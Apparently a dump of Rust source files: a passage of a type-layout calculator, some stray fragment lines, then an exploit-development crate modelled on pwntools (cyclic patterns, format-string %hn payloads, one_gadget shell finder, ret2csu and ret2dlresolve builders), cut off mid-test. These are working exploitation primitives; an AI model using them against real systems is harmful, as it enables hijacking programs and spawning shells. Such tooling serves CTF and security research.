            TypeRef::Named(name) => {
                if !seen.insert(name.clone()) {
                    return None;
                }
                let out = self.named_align(name, seen);
                seen.remove(name);
                out
            }
        }
    }

    fn named_size(&self, name: &str, seen: &mut BTreeSet<String>) -> Option<u64> {
        match self.types.get(name)? {
            UserType::Enum { width, .. } => Some(width.size()),
            UserType::Typedef { target, .. } => self.size_of_guarded(target, seen),
            UserType::Struct { fields, .. } => {
                let (size, _) = self.lay_fields(fields, seen)?;
                Some(size)
            }
            UserType::Union { fields, .. } => {
                let mut size = 0;
                let mut align = 1;
                for f in fields {
                    let fs = self.field_size(f, seen)?;
                    let fa = self.align_of_guarded(&f.ty, seen)?;
                    size = size.max(fs);
                    align = align.max(fa);
                }
                Some(round_up(size, align))
            }
        }
    }

    fn named_align(&self, name: &str, seen: &mut BTreeSet<String>) -> Option<u64> {
        match self.types.get(name)? {
            UserType::Enum { width, .. } => Some(width.align()),
            UserType::Typedef { target, .. } => self.align_of_guarded(target, seen),
            UserType::Struct { fields, .. } | UserType::Union { fields, .. } => {
                let mut align = 1;
                for f in fields {
                    align = align.max(self.align_of_guarded(&f.ty, seen)?);
                }
                Some(align)
            }
        }
    }

    /// Total size of a field (element size × count).
    fn field_size(&self, f: &FieldDef, seen: &mut BTreeSet<String>) -> Option<u64> {
        let elem = self.size_of_guarded(&f.ty, seen)?;
        Some(elem.saturating_mul(f.count.max(1)))
    }

    /// Lays struct fields out in order, returning (total size, placed fields).
    fn lay_fields(
        &self,
        fields: &[FieldDef],
        seen: &mut BTreeSet<String>,
    ) -> Option<(u64, Vec<LaidField>)> {
        let mut offset = 0u64;
        let mut max_align = 1u64;
        let mut out = Vec::with_capacity(fields.len());
        for f in fields {
            let align = self.align_of_guarded(&f.ty, seen)?.max(1);
            let size = self.field_size(f, seen)?;
            offset = round_up(offset, align);
            max_align = max_align.max(align);
            out.push(LaidField {
                path: f.name.clone(),
                ty: f.ty.clone(),
                count: f.count.max(1),
                offset,
                size,
            });
            offset = offset.saturating_add(size);
        }
        Some((round_up(offset, max_align), out))
    }

    /// Places every field of a struct or union in memory for the layout preview and the
    /// Inspector. `None` if the type cannot be laid out (missing or cyclic member).
    pub fn layout(&self, ty: &UserType) -> Option<Vec<LaidField>> {
        let mut seen = BTreeSet::new();
        seen.insert(ty.name().to_owned());
        match ty {
            UserType::Struct { fields, .. } => Some(self.lay_fields(fields, &mut seen)?.1),
            UserType::Union { fields, .. } => {
                let mut out = Vec::with_capacity(fields.len());
                for f in fields {
                    out.push(LaidField {
                        path: f.name.clone(),
                        ty: f.ty.clone(),
                        count: f.count.max(1),
                        offset: 0,
                        size: self.field_size(f, &mut seen)?,
                    });
                }
                Some(out)
            }
            UserType::Enum { .. } | UserType::Typedef { .. } => Some(Vec::new()),
        }
    }

    /// Checks a type is well formed: valid identifiers, unique non-empty field names,
    /// every referenced type resolves, and no by-value cycle.
    pub fn validate(&self, ty: &UserType) -> Result<(), String> {
        validate_name(ty.name()).map_err(|e| format!("type name: {e}"))?;
        if ty.name().trim().is_empty() {
            return Err("a type needs a name".into());
        }
        match ty {
            UserType::Struct { fields, .. } | UserType::Union { fields, .. } => {
                if fields.is_empty() {
                    return Err("add at least one field".into());
                }
                let mut names = BTreeSet::new();
                for f in fields {
                    let fname = f.name.trim();
                    validate_name(fname).map_err(|e| format!("field `{}`: {e}", f.name))?;
                    if fname.is_empty() {
                        return Err("every field needs a name".into());
                    }
                    if !names.insert(fname.to_owned()) {
                        return Err(format!("duplicate field name `{fname}`"));
                    }
                    self.resolve_ref(&f.ty)?;
                }
            }
            UserType::Enum {
                variants, width, ..
            } => {
                if !matches!(
                    width,
                    Prim::U8
                        | Prim::I8
                        | Prim::U16
                        | Prim::I16
                        | Prim::U32
                        | Prim::I32
                        | Prim::U64
                        | Prim::I64
                ) {
                    return Err("enum underlying type must be an integer".into());
                }
                if variants.is_empty() {
                    return Err("add at least one variant".into());
                }
                let mut names = BTreeSet::new();
                for (vname, _) in variants {
                    let vname = vname.trim();
                    validate_name(vname).map_err(|e| format!("variant `{vname}`: {e}"))?;
                    if vname.is_empty() {
                        return Err("every variant needs a name".into());
                    }
                    if !names.insert(vname.to_owned()) {
                        return Err(format!("duplicate variant name `{vname}`"));
                    }
                }
            }
            UserType::Typedef { target, .. } => self.resolve_ref(target)?,
        }
        // A by-value cycle makes the size unresolvable; catch it with the type in place.
        let mut probe = self.clone();
        probe.types.insert(ty.name().to_owned(), ty.clone());
        if probe
            .size_of(&TypeRef::Named(ty.name().to_owned()))
            .is_none()
        {
            return Err("this type refers to itself by value (use a pointer instead)".into());
        }
        Ok(())
    }

    /// Checks a type reference names only things that exist. Pointers are not followed,
    /// so `*Missing` is still an error but `*SelfType` is fine.
    fn resolve_ref(&self, ty: &TypeRef) -> Result<(), String> {
        match ty {
            TypeRef::Prim(_) => Ok(()),
            TypeRef::Pointer(inner) => self.resolve_ref(inner),
            TypeRef::Named(name) => {
                if self.types.contains_key(name) {
                    Ok(())
                } else {
                    Err(format!("unknown type `{name}`"))
                }
            }
        }
    }
}

/// Whether a type reference mentions the named type (following pointers), used to drop
/// data applications when their type is deleted.
pub fn references(ty: &TypeRef, name: &str) -> bool {
    match ty {
        TypeRef::Prim(_) => false,
        TypeRef::Pointer(inner) => references(inner, name),
        TypeRef::Named(n) => n == name,
    }
}

/// Rounds `value` up to the next multiple of `align` (a power of two or any non-zero).
fn round_up(value: u64, align: u64) -> u64 {
    if align <= 1 {
        return value;
    }
    value.div_ceil(align).saturating_mul(align)
}

    }

    }

        assert_eq!(cat(vec![], Some(64)).size_of(&p).unwrap(), 8);
        assert_eq!(cat(vec![], Some(32)).size_of(&p).unwrap(), 4);

`crates/orress-pwn/src/cyclic.rs`:

```rs
//! Cyclic (de Bruijn) patterns: generate a non-repeating pattern, then recover the offset of any
//! `n`-byte window in it — how you find the distance to the saved return address after a crash.

/// The default alphabet (lowercase ASCII) and window size, matching pwntools.
pub const DEFAULT_ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
pub const DEFAULT_N: usize = 4;

/// The first `length` bytes of a de Bruijn sequence over `alphabet` with window size `n`. Every
/// `n`-byte window is unique, so a window recovered from a crash pins down its offset.
pub fn cyclic(length: usize, alphabet: &[u8], n: usize) -> Vec<u8> {
    de_bruijn(alphabet, n, length)
}

/// The offset of the first occurrence of `sub` (an `n`-byte window) in `cyclic(..)`, or `None`.
pub fn cyclic_find(sub: &[u8], alphabet: &[u8], n: usize) -> Option<usize> {
    if sub.len() < n {
        return None;
    }
    let needle = &sub[..n];
    // The sequence is at most alphabet.len()^n long; generate it all and search.
    let full = de_bruijn(alphabet, n, usize::MAX);
    full.windows(n).position(|w| w == needle)
}

/// Generates up to `limit` bytes of the de Bruijn sequence B(k, n) (Frank Ruskey's algorithm),
/// mapping symbol indices through `alphabet`.
fn de_bruijn(alphabet: &[u8], n: usize, limit: usize) -> Vec<u8> {
    let k = alphabet.len();
    if k == 0 || n == 0 {
        return Vec::new();
    }
    let mut seq: Vec<u8> = Vec::new();
    let mut a = vec![0usize; k * n + 1];
    // Iterative form of the classic recursion db(t, p), to avoid deep recursion for large k^n.
    let mut stack: Vec<(usize, usize, usize)> = vec![(1, 1, 0)];
    // Each frame: (t, p, phase) — phase 0 = enter, >=1 = next j to try.
    'outer: while let Some(&mut (t, p, ref mut phase)) = stack.last_mut() {
        if t > n {
            if n.is_multiple_of(p) {
                for &idx in &a[1..=p] {
                    seq.push(alphabet[idx]);
                    if seq.len() >= limit {
                        break 'outer;
                    }
                }
            }
            stack.pop();
            continue;
        }
        if *phase == 0 {
            a[t] = a[t - p];
            *phase = a[t - p] + 1;
            stack.push((t + 1, p, 0));
            continue;
        }
        let j = *phase;
        if j < k {
            a[t] = j;
            *phase += 1;
            stack.push((t + 1, t, 0));
        } else {
            stack.pop();
        }
    }
    seq
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pattern_is_long_and_nonrepeating_in_windows() {
        let pat = cyclic(600, DEFAULT_ALPHABET, DEFAULT_N);
        assert_eq!(pat.len(), 600);
        // Every 4-byte window is unique.
        let mut seen = std::collections::HashSet::new();
        for w in pat.windows(DEFAULT_N) {
            assert!(seen.insert(w.to_vec()), "window {w:?} repeated");
        }
    }

    #[test]
    fn find_recovers_offsets() {
        let pat = cyclic(500, DEFAULT_ALPHABET, DEFAULT_N);
        for off in [0usize, 1, 42, 100, 255, 496] {
            let window = &pat[off..off + 4];
            assert_eq!(cyclic_find(window, DEFAULT_ALPHABET, DEFAULT_N), Some(off));
        }
    }
}

`crates/orress-pwn/src/fmtstr.rs`:

```rs
//! Format-string write payloads: build a printf format string that writes chosen values to chosen
//! addresses via the `%n` family (pwntools' `fmtstr_payload`). 64-bit, two-byte (`%hn`) writes.
//!
//! `offset` is the printf argument index at which the payload itself begins on the stack (the usual
//! "the Nth `%p` is my input" offset). Each requested 64-bit value is split into little-endian
//! 2-byte half-words (trailing zero half-words dropped); the half-word writes are emitted in
//! ascending value order so the running `%c` character count only grows.

/// Builds a format-string payload writing each `(addr, value)` with `%hn`.
pub fn fmtstr_payload(offset: usize, writes: &[(u64, u64)]) -> Vec<u8> {
    // Expand to half-word writes, dropping high zero half-words (keep at least one).
    let mut parts: Vec<(u64, u16)> = Vec::new();
    for &(addr, value) in writes {
        let hws = [
            value as u16,
            (value >> 16) as u16,
            (value >> 32) as u16,
            (value >> 48) as u16,
        ];
        let top = (0..4).rev().find(|&k| hws[k] != 0).unwrap_or(0);
        for (k, &hw) in hws.iter().enumerate().take(top + 1) {
            parts.push((addr + 2 * k as u64, hw));
        }
    }
    parts.sort_by_key(|&(_, v)| v);

    // Fixpoint: the number of 8-byte stack slots the directives occupy sets the argument index of
    // the first address, which in turn affects the directive text length.
    let mut slots = parts.len();
    for _ in 0..8 {
        let directives = build_directives(offset, &parts, slots);
        let padded = directives.len().div_ceil(8) * 8;
        let new_slots = padded / 8;
        if new_slots == slots {
            break;
        }
        slots = new_slots;
    }

    let mut out = build_directives(offset, &parts, slots);
    while !out.len().is_multiple_of(8) {
        out.push(b'.'); // non-null padding to an 8-byte boundary
    }
    for (addr, _) in &parts {
        out.extend_from_slice(&addr.to_le_bytes());
    }
    out
}

/// The directive portion: for each half-word write, a `%<delta>c` to advance the count to the
/// target, then a positional `%<arg>$hn` that writes the low 16 bits of the count to that address.
fn build_directives(offset: usize, parts: &[(u64, u16)], slots: usize) -> Vec<u8> {
    let mut s = Vec::new();
    let mut printed: u32 = 0;
    for (i, &(_, value)) in parts.iter().enumerate() {
        let target = u32::from(value);
        let delta = target.wrapping_sub(printed) & 0xffff;
        if delta != 0 {
            s.extend_from_slice(format!("%{delta}c").as_bytes());
            printed = printed.wrapping_add(delta);
        }
        let arg = offset + slots + i;
        s.extend_from_slice(format!("%{arg}$hn").as_bytes());
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// A tiny glibc-style printf that understands `%<width>c` (advances the count, consumes a
    /// sequential arg) and positional `%<n>$hn` (writes the low 16 bits of the count to the address
    /// held in arg n). `args[i]` is the 8-byte stack slot at argument index `i`. Returns the writes.
    fn simulate(fmt: &[u8], args: &HashMap<usize, u64>) -> HashMap<u64, u16> {
        let mut writes = HashMap::new();
        let mut printed: u32 = 0;
        let mut seq = 0usize; // next sequential arg
        let mut i = 0usize;
        while i < fmt.len() {
            if fmt[i] != b'%' {
                printed += 1;
                i += 1;
                continue;
            }
            i += 1; // past '%'
            // read a number
            let start = i;
            while i < fmt.len() && fmt[i].is_ascii_digit() {
                i += 1;
            }
            let num: usize = std::str::from_utf8(&fmt[start..i])
                .unwrap()
                .parse()
                .unwrap_or(0);
            if i < fmt.len() && fmt[i] == b'c' {
                printed += num as u32; // %<num>c prints num chars
                seq += 1; // consumes one sequential arg
                i += 1;
            } else if i < fmt.len() && fmt[i] == b'$' {
                // positional: %<num>$hn
                i += 1;
                assert_eq!(&fmt[i..i + 2], b"hn", "only %hn is simulated");
                i += 2;
                let addr = *args.get(&num).expect("arg present");
                writes.insert(addr, (printed & 0xffff) as u16);
            } else {
                panic!("unexpected directive");
            }
        }
        let _ = seq;
        writes
    }

    /// Lays the payload out as the stack starting at `offset` and runs the simulator.
    fn check(offset: usize, writes: &[(u64, u64)]) {
        let payload = fmtstr_payload(offset, writes);
        // Build the arg map: argument k (k >= offset) is the 8-byte slot (k-offset)*8 of the payload.
        let mut args = HashMap::new();
        for k in 0..(payload.len() / 8 + 1) {
            let off = k * 8;
            if off + 8 <= payload.len() {
                let v = u64::from_le_bytes(payload[off..off + 8].try_into().unwrap());
                args.insert(offset + k, v);
            }
        }
        let got = simulate(&payload, &args);
        // Every requested half-word must have been written correctly.
        for &(addr, value) in writes {
            let hws = [
                value as u16,
                (value >> 16) as u16,
                (value >> 32) as u16,
                (value >> 48) as u16,
            ];
            let top = (0..4).rev().find(|&k| hws[k] != 0).unwrap_or(0);
            for (k, &hw) in hws.iter().enumerate().take(top + 1) {
                let a = addr + 2 * k as u64;
                assert_eq!(got.get(&a), Some(&hw), "write to {a:#x} (value {value:#x})");
            }
        }
    }

    #[test]
    fn single_write_round_trips_through_printf() {
        check(6, &[(0x601020, 0xdead)]);
        check(6, &[(0x601020, 0xdeadbeef)]);
    }

    #[test]
    fn two_writes_round_trip() {
        check(8, &[(0x404018, 0x1234), (0x404028, 0x4567)]);
    }

    #[test]
    fn full_address_value_round_trips() {
        check(6, &[(0x404018, 0x7ffff7a52290)]);
    }
}

`crates/orress-pwn/src/one_gadget.rs`:

```rs
//! A pragmatic "one_gadget" finder: scan a libc's executable bytes for a single address that, when
//! jumped to, runs `execve("/bin/sh", …)` — the magic gadgets used to pop a shell from a single
//! control-flow hijack. This is a heuristic scanner (match the common shapes), not a full
//! constraint solver like the `one_gadget` tool, so it reports candidate addresses and the register
//! preconditions it could not already see satisfied.

use orress_arch::{Flow, Isa, decode};

/// A candidate one-shot execve gadget.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct OneGadget {
    pub addr: u64,
    /// Register preconditions still to satisfy (e.g. argv/envp must be NULL).
    pub constraints: Vec<String>,
}

/// Finds candidate one_gadgets in `exec` (each `(virtual base, bytes)`). `binsh` is the address of
/// the `"/bin/sh"` string; `execve` lists the addresses of `execve` (direct call targets) to match.
pub fn find_one_gadgets(
    exec: &[(u64, &[u8])],
    binsh: u64,
    execve: &[u64],
    isa: Isa,
) -> Vec<OneGadget> {
    let mut out = Vec::new();
    for &(base, bytes) in exec {
        let mut off = 0usize;
        let mut gadget: Option<u64> = None; // address that sets rdi = &"/bin/sh"
        let mut rsi_null = false;
        let mut rdx_null = false;
        while off < bytes.len() {
            let Some(insn) = decode(
                isa,
                &bytes[off..(off + 15).min(bytes.len())],
                base + off as u64,
            ) else {
                off += 1;
                continue;
            };
            if insn.len == 0 {
                off += 1;
                continue;
            }
            let addr = base + off as u64;
            let text = insn.text();

            if writes_reg(&text, "di") && insn.data_refs.contains(&binsh) {
                // rdi <- &"/bin/sh"
                gadget = Some(addr);
                rsi_null = false;
                rdx_null = false;
            } else if is_zeroed(&text, "si") {
                rsi_null = true;
            } else if is_zeroed(&text, "dx") {
                rdx_null = true;
            } else if writes_reg(&text, "di") {
                gadget = None; // rdi clobbered with something else
            } else if matches!(insn.flow, Flow::Return | Flow::Jump(_)) {
                gadget = None;
                rsi_null = false;
                rdx_null = false;
            }

            let reaches_execve = match insn.flow {
                Flow::Call(t) => execve.contains(&t),
                _ => insn.mnemonic == "syscall",
            };
            if reaches_execve && let Some(g) = gadget.take() {
                let mut constraints = Vec::new();
                if !rsi_null {
                    constraints.push("rsi (argv) == NULL".into());
                }
                if !rdx_null {
                    constraints.push("rdx (envp) == NULL".into());
                }
                out.push(OneGadget {
                    addr: g,
                    constraints,
                });
            }
            off += usize::from(insn.len);
        }
    }
    out.sort_by_key(|g| g.addr);
    out.dedup_by_key(|g| g.addr);
    out
}

/// Whether `text` writes register `r{suffix}`/`e{suffix}` as its destination (a `mov`/`lea`/`pop`).
fn writes_reg(text: &str, suffix: &str) -> bool {
    let (r, e) = (format!("r{suffix}"), format!("e{suffix}"));
    for m in ["mov", "lea", "pop", "xor", "add", "sub"] {
        if text.starts_with(&format!("{m} {r},")) || text.starts_with(&format!("{m} {e},")) {
            return true;
        }
        if m == "pop" && (text == format!("pop {r}") || text == format!("pop {e}")) {
            return true;
        }
    }
    false
}

/// Whether `text` zeroes register `{suffix}` (`xor esi, esi` / `xor rsi, rsi` / `mov esi, 0`).
fn is_zeroed(text: &str, suffix: &str) -> bool {
    let (r, e) = (format!("r{suffix}"), format!("e{suffix}"));
    // The disassembler formats operands with no space after the comma ("xor esi,esi").
    text == format!("xor {e},{e}")
        || text == format!("xor {r},{r}")
        || text == format!("mov {e},0")
        || text == format!("mov {r},0")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_an_execve_gadget_with_no_outstanding_constraints() {
        // lea rdi, [rip+0] resolves to the next instruction's address; point "/bin/sh" there,
        // then null argv/envp and syscall.
        let base = 0x1000u64;
        let bytes = orress_asm::assemble(
            "lea rdi, [rip+0]\nxor esi, esi\nxor edx, edx\nsyscall",
            orress_asm::Arch::X64,
            base,
        )
        .unwrap()
        .bytes;
        // The lea is 7 bytes, so rip+0 resolves to base+7.
        let binsh = base + 7;
        let gadgets = find_one_gadgets(&[(base, &bytes)], binsh, &[], Isa::X64);
        assert_eq!(gadgets.len(), 1, "gadgets: {gadgets:?}");
        assert_eq!(gadgets[0].addr, base);
        assert!(
            gadgets[0].constraints.is_empty(),
            "{:?}",
            gadgets[0].constraints
        );
    }

    #[test]
    fn reports_outstanding_null_constraints() {
        let base = 0x2000u64;
        let bytes = orress_asm::assemble("lea rdi, [rip+0]\nsyscall", orress_asm::Arch::X64, base)
            .unwrap()
            .bytes;
        let binsh = base + 7;
        let gadgets = find_one_gadgets(&[(base, &bytes)], binsh, &[], Isa::X64);
        assert_eq!(gadgets.len(), 1);
        assert_eq!(gadgets[0].constraints.len(), 2); // rsi and rdx must be NULL
    }
}

`crates/orress-pwn/src/pack.rs`:

```rs
//! Integer packing and unpacking, the pwntools `p*`/`u*` primitives everything else is built on.

/// Byte order for packing.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Endian {
    Little,
    Big,
}

/// Packs the low `width` bytes of `value` (1, 2, 4 or 8) in the given byte order.
pub fn pack(value: u64, width: usize, endian: Endian) -> Vec<u8> {
    let width = width.min(8);
    let mut out = value.to_le_bytes()[..width].to_vec();
    if endian == Endian::Big {
        out.reverse();
    }
    out
}

/// Unpacks up to 8 bytes into a `u64` in the given byte order (shorter input is zero-extended).
pub fn unpack(bytes: &[u8], endian: Endian) -> u64 {
    let mut buf = [0u8; 8];
    let n = bytes.len().min(8);
    match endian {
        Endian::Little => buf[..n].copy_from_slice(&bytes[..n]),
        Endian::Big => {
            for (i, b) in bytes[..n].iter().rev().enumerate() {
                buf[i] = *b;
            }
        }
    }
    u64::from_le_bytes(buf)
}

pub fn p8(v: u64) -> Vec<u8> {
    pack(v, 1, Endian::Little)
}
pub fn p16(v: u64) -> Vec<u8> {
    pack(v, 2, Endian::Little)
}
pub fn p32(v: u64) -> Vec<u8> {
    pack(v, 4, Endian::Little)
}
pub fn p64(v: u64) -> Vec<u8> {
    pack(v, 8, Endian::Little)
}

pub fn u8v(b: &[u8]) -> u64 {
    unpack(&b[..b.len().min(1)], Endian::Little)
}
pub fn u16v(b: &[u8]) -> u64 {
    unpack(&b[..b.len().min(2)], Endian::Little)
}
pub fn u32v(b: &[u8]) -> u64 {
    unpack(&b[..b.len().min(4)], Endian::Little)
}
pub fn u64v(b: &[u8]) -> u64 {
    unpack(&b[..b.len().min(8)], Endian::Little)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn pack_round_trips() {
        assert_eq!(p64(0x0102030405060708), vec![8, 7, 6, 5, 4, 3, 2, 1]); // little-endian
        assert_eq!(p32(0xdeadbeef), vec![0xef, 0xbe, 0xad, 0xde]);
        assert_eq!(
            pack(0xdeadbeef, 4, Endian::Big),
            vec![0xde, 0xad, 0xbe, 0xef]
        );
        assert_eq!(u64v(&p64(0x1122334455667788)), 0x1122334455667788);
        assert_eq!(u32v(&[0xef, 0xbe, 0xad, 0xde]), 0xdeadbeef);
        assert_eq!(unpack(&[0xde, 0xad, 0xbe, 0xef], Endian::Big), 0xdeadbeef);
    }
}

`crates/orress-pwn/src/ret2csu.rs`:

```rs
//! ret2csu: reuse the universal gadget in `__libc_csu_init` to call any function pointer with three
//! controlled arguments, even when the binary has no `pop rdi/rsi/rdx` gadgets. The standard gcc
//! `__libc_csu_init` tail is:
//!
//! ```text
//!   pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret      ; "pop6" gadget
//!   mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]   ; "mov/call" gadget
//!   ... add rsp, 8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
//! ```
//!
//! Setting `rbx=0, rbp=1` makes the trailing `cmp rbx, rbp` exit the loop after one call, which
//! calls `[r12]` with `edi=r13, rsi=r14, rdx=r15`. Note `edi` is 32-bit, so the first argument is
//! truncated to 32 bits, and `r12` must point at memory holding the target address (e.g. a GOT slot).

use orress_arch::{Flow, Isa, decode};

/// Builds a ret2csu chain calling `*call_ptr` with `args` (arg0 truncated to 32 bits), returning to
/// `ret_after`. `pop6` and `mov_call` are the two gadget addresses (see [`find_csu`]).
pub fn chain(pop6: u64, mov_call: u64, call_ptr: u64, args: [u64; 3], ret_after: u64) -> Vec<u8> {
    let mut out = Vec::new();
    let mut push = |v: u64| out.extend_from_slice(&v.to_le_bytes());
    push(pop6);
    push(0); // rbx = 0
    push(1); // rbp = 1
    push(call_ptr); // r12
    push(args[0]); // r13 -> edi
    push(args[1]); // r14 -> rsi
    push(args[2]); // r15 -> rdx
    push(mov_call);
    push(0); // skipped by `add rsp, 8`
    for _ in 0..6 {
        push(0); // the trailing pop rbx..r15
    }
    push(ret_after);
    out
}

/// Finds the `__libc_csu_init` "pop6" and "mov/call" gadgets in `exec` (each `(base, bytes)`).
pub fn find_csu(exec: &[(u64, &[u8])], isa: Isa) -> Option<(u64, u64)> {
    let pop6 = find_sequence(
        exec,
        isa,
        &[
            "pop rbx", "pop rbp", "pop r12", "pop r13", "pop r14", "pop r15",
        ],
        |insn| matches!(insn.flow, Flow::Return),
    )?;
    let mov_call = find_sequence(
        exec,
        isa,
        &["mov rdx,r15", "mov rsi,r14", "mov edi,r13d"],
        |insn| insn.mnemonic == "call" && insn.text().contains("r12+rbx"),
    )?;
    Some((pop6, mov_call))
}

/// Finds the address of the first instruction of a run matching `prefix` (exact instruction texts)
/// followed by an instruction for which `last` holds.
fn find_sequence(
    exec: &[(u64, &[u8])],
    isa: Isa,
    prefix: &[&str],
    last: impl Fn(&orress_arch::Insn) -> bool,
) -> Option<u64> {
    for &(base, bytes) in exec {
        let mut off = 0usize;
        while off < bytes.len() {
            if let Some(addr) = matches_here(bytes, base, off, isa, prefix, &last) {
                return Some(addr);
            }
            // advance by one decoded instruction (fall back to 1 byte)
            let step = decode(
                isa,
                &bytes[off..(off + 15).min(bytes.len())],
                base + off as u64,
            )
            .map_or(1, |i| usize::from(i.len).max(1));
            off += step;
        }
    }
    None
}

fn matches_here(
    bytes: &[u8],
    base: u64,
    start: usize,
    isa: Isa,
    prefix: &[&str],
    last: &impl Fn(&orress_arch::Insn) -> bool,
) -> Option<u64> {
    let mut off = start;
    for want in prefix {
        let insn = decode(
            isa,
            &bytes[off..(off + 15).min(bytes.len())],
            base + off as u64,
        )?;
        if insn.len == 0 || &insn.text() != want {
            return None;
        }
        off += usize::from(insn.len);
    }
    let insn = decode(
        isa,
        &bytes[off..(off + 15).min(bytes.len())],
        base + off as u64,
    )?;
    if last(&insn) {
        Some(base + start as u64)
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chain_layout() {
        let c = chain(0x401000, 0x400fe0, 0x404018, [0x1, 0x2, 0x3], 0x401234);
        assert_eq!(c.len(), 16 * 8);
        let q = |i: usize| u64::from_le_bytes(c[i * 8..i * 8 + 8].try_into().unwrap());
        assert_eq!(q(0), 0x401000); // pop6
        assert_eq!(q(1), 0); // rbx
        assert_eq!(q(2), 1); // rbp
        assert_eq!(q(3), 0x404018); // r12 = call ptr
        assert_eq!(q(4), 0x1); // r13 -> edi
        assert_eq!(q(7), 0x400fe0); // mov/call gadget
        assert_eq!(q(15), 0x401234); // ret_after
    }

    #[test]
    fn finds_the_csu_gadgets() {
        let base = 0x401000u64;
        let bytes = orress_asm::assemble(
            "pop rbx\npop rbp\npop r12\npop r13\npop r14\npop r15\nret\n\
             mov rdx, r15\nmov rsi, r14\nmov edi, r13d\ncall qword ptr [r12+rbx*8]",
            orress_asm::Arch::X64,
            base,
        )
        .unwrap()
        .bytes;
        let (pop6, mov_call) = find_csu(&[(base, &bytes)], Isa::X64).expect("found");
        assert_eq!(pop6, base);
        // pop rbx/rbp are 1 byte, pop r12..r15 need a REX prefix (2 bytes each), ret 1 byte = 11.
        assert_eq!(mov_call, base + 11);
    }
}

`crates/orress-pwn/src/ret2dlresolve.rs`:

```rs
//! ret2dlresolve (x86-64, "Structure" method): forge the `Elf64_Rela`, `Elf64_Sym` and name string
//! that the lazy dynamic linker reads, so returning into `PLT[0]` (`_dl_runtime_resolve`) with a
//! chosen relocation index resolves and calls an arbitrary libc symbol (e.g. `system`) — no libc
//! leak needed. Classic against non-full-RELRO dynamically-linked binaries.
//!
//! The deterministic structure/index math is unit-tested here; the end-to-end resolve depends on
//! the target's linker and must be confirmed on a live Linux run.

/// An ELF relocation/symbol structure is 24 bytes on x86-64.
const ENT: u64 = 24;
/// `R_X86_64_JUMP_SLOT`.
const R_JUMP_SLOT: u64 = 7;
/// `STB_GLOBAL | STT_FUNC` for `st_info`.
const ST_INFO: u8 = 0x12;

/// The forged payload: `bytes` to write at the chosen address, and the `reloc_index` to return into
/// `PLT[0]` with.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Payload {
    pub bytes: Vec<u8>,
    pub reloc_index: u64,
}

/// The smallest address `>= v` that is congruent to `base` modulo `align` (so `(x - base)` is a
/// whole number of `align`-byte entries).
fn align_entry(v: u64, base: u64, align: u64) -> u64 {
    let rem = v.wrapping_sub(base) % align;
    if rem == 0 { v } else { v + (align - rem) }
}

/// Builds the forged structures to place at `write_to`, resolving `symbol` and (on resolve) writing
/// the result to `got_target`. `dynsym`/`dynstr`/`rela_plt` are the binary's section addresses.
/// Returns `None` if the layout cannot be formed (addresses out of range).
pub fn build(
    dynsym: u64,
    dynstr: u64,
    rela_plt: u64,
    write_to: u64,
    got_target: u64,
    symbol: &str,
) -> Option<Payload> {
    let name = symbol.as_bytes();

    // Place the fake Rela at an rela_plt-aligned address, the fake Sym at a dynsym-aligned address
    // after it, then the name string.
    let rela_addr = align_entry(write_to, rela_plt, ENT);
    let reloc_index = (rela_addr.checked_sub(rela_plt)?) / ENT;
    let sym_addr = align_entry(rela_addr + ENT, dynsym, ENT);
    let sym_index = (sym_addr.checked_sub(dynsym)?) / ENT;
    let name_addr = sym_addr + ENT;
    let st_name = name_addr.checked_sub(dynstr)?;
    if st_name > u64::from(u32::MAX) {
        return None;
    }

    let total = (name_addr + name.len() as u64 + 1).checked_sub(write_to)? as usize;
    let mut bytes = vec![0u8; total];
    let mut put = |addr: u64, data: &[u8]| {
        let o = (addr - write_to) as usize;
        bytes[o..o + data.len()].copy_from_slice(data);
    };

    // Elf64_Rela { r_offset = got_target, r_info = (sym_index << 32) | R_JUMP_SLOT, r_addend = 0 }.
    put(rela_addr, &got_target.to_le_bytes());
    put(
        rela_addr + 8,
        &((sym_index << 32) | R_JUMP_SLOT).to_le_bytes(),
    );
    // r_addend already zero.
    // Elf64_Sym { st_name, st_info = 0x12, st_other = 0, st_shndx = 0, st_value = 0, st_size = 0 }.
    put(sym_addr, &(st_name as u32).to_le_bytes());
    put(sym_addr + 4, &[ST_INFO]);
    // Name string (NUL-terminated; the buffer is already zeroed).
    put(name_addr, name);

    Some(Payload { bytes, reloc_index })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn structures_are_well_formed() {
        // Representative section addresses from a small non-PIE binary.
        let dynsym = 0x400370;
        let dynstr = 0x400400;
        let rela_plt = 0x400460;
        let write_to = 0x601000; // .bss
        let got_target = 0x601018;
        let p = build(dynsym, dynstr, rela_plt, write_to, got_target, "system").unwrap();

        // The Rela sits at an rela_plt-aligned address; reloc_index matches.
        let rela_addr = write_to + p.reloc_index * ENT.wrapping_sub(0); // placeholder, recomputed below
        let _ = rela_addr;
        let rela_abs = rela_plt + p.reloc_index * ENT;
        assert!(rela_abs >= write_to && (rela_abs - rela_plt).is_multiple_of(ENT));

        let at = |addr: u64| -> u64 {
            let o = (addr - write_to) as usize;
            u64::from_le_bytes(p.bytes[o..o + 8].try_into().unwrap())
        };
        // r_offset
        assert_eq!(at(rela_abs), got_target);
        // r_info: low 32 bits = R_JUMP_SLOT, high = sym_index
        let r_info = at(rela_abs + 8);
        assert_eq!(r_info & 0xffff_ffff, R_JUMP_SLOT);
        let sym_index = r_info >> 32;
        let sym_addr = dynsym + sym_index * ENT;
        assert!(sym_addr > rela_abs && (sym_addr - dynsym).is_multiple_of(ENT));

        // Sym: st_info byte and st_name pointing into our string.
        let sym_o = (sym_addr - write_to) as usize;
        assert_eq!(p.bytes[sym_o + 4], ST_INFO);
        let st_name = u32::from_le_bytes(p.bytes[sym_o..sym_o + 4].try_into().unwrap()) as u64;
        let name_addr = dynstr + st_name;
        let name_o = (name_addr - write_to) as usize;
